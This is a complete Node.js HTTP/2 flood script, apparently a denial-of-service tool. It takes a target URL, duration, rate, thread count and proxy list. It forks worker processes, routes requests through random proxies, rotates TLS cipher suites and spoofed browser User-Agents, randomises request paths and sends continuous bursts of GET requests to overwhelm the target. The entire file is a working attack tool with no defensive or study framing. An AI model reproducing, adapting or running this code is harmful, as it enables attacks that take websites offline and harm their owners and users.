process.on('uncaughtException', function (er) {
    //console.log(er);
 });
 process.on('unhandledRejection', function (er) {
    //console.log(er);
 });
 require('events').EventEmitter.defaultMaxListeners = 0;
 const fs = require('fs');
 const url = require('url');
 const randstr = require('randomstring');
 
 var path = require("path");
 const cluster = require('cluster');
 const http2 = require('http2');
 
 //example node mrrage.js 'https://www.target.com/' 60 64 1 http_proxies.txt

 if (process.argv.length < 7) {
     console.log('\nUsage: node ' + path.basename(__filename) + ' [url] [time] [rate] [threads] [proxies.txt]\n');
     process.exit(0);
 }
 
 let randomparam = false;
 var proxies = fs.readFileSync(process.argv[6], 'utf-8').toString().replace(/\r/g, '').split('\n');
 var rate = process.argv[4];
 var target_url = process.argv[2];
 const target = target_url.split('""')[0];
 
 var parsed = url.parse(target);
 process.setMaxListeners(0);
 
 const cplist = [
     "RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
     "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
     "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH"
 ];
 
 const UAs = [
    "Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/605.1.15 (KHTML, like Gecko)",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1.2 Safari/605.1.15",
    "Mozilla/5.0 (X11; CrOS x86_64 14268.67.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.111 Safari/537.36",
    "Nokia7610/2.0 (5.0509.0) SymbianOS/7.0s Series60/2.1 Profile/MIDP-2.0 Configuration/CLDC-1.0",
    "Mozilla/5.0 (Linux; Android 9; KFMAWI) AppleWebKit/537.36 (KHTML, like Gecko) Silk/93.2.7 like Chrome/93.0.4577.82 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
    "Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.116 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 5.1.1; Lenovo-A6020l36 Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.93 Mobile Safari/537.36",
 ];

 function query() {
    const rsdat = randstr.generate({
        "charset": "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890",
        "length": 8
    });
    return rsdat;
 }

 if (cluster.isMaster) {
    for (let i = 1; i <= process.argv[5]; i++) {
        cluster.fork();
    }
    console.log(process.argv[5] + " Threads Started Flooding");
    setTimeout(() => {
        process.exit(0);
    }, process.argv[3] * 1000);
 } else {
    startflood();
 }
 function startflood() {
     setInterval(() => {
         var headerbuilders = {
            ":authority": parsed.host,
            ":method": "GET",
            ":scheme": "https",
            "cache-control": "max-age=0",
            "upgrade-insecure-requests": "1",
            "User-Agent": UAs[Math.floor(Math.random() * UAs.length)],
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "accept-language": "en-US,en;q=0.5",
            "accept-Encoding": "gzip, deflate, br",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "cross-site",
            "sec-ch-ua-platform": "Windows",
         };
         var cipper = cplist[Math.floor(Math.random() * cplist.length)];
 
         var proxy = proxies[Math.floor(Math.random() * proxies.length)];
         proxy = proxy.split(':');
 
         var http = require('http'),
             tls = require('tls');
 
         tls.DEFAULT_MAX_VERSION = 'TLSv1.3';
 
         var req = http.request({
             host: proxy[0],
             port: proxy[1],
             ciphers: cipper,
             method: 'CONNECT',
             path: parsed.host + ":443"
         }, (err) => {
             req.end();
             return;
         });
 
         req.on('connect', function (res, socket, head) {
             const client = http2.connect(parsed.href, {
                 createConnection: () => tls.connect({
                     host: parsed.host,
                     ciphers: cipper,
                     secureProtocol: 'TLS_method',
                     servername: parsed.host,
                     secure: true,
                     rejectUnauthorized: false,
                     ALPNProtocols: ['h2'],
                     sessionTimeout: 3800,
                     socket: socket
                 }, function () {
                     for (let i = 0; i < rate; i++) {
                         headerbuilders[":path"] = url.parse(target).path.replace(/%rand%/g, query());
                         const req = client.request(headerbuilders);
                         req.end();
                         req.on("response", () => {
                             req.close();
                         })
                     }
                 })
             });
         });
         req.end();
         req.close();
     });
 }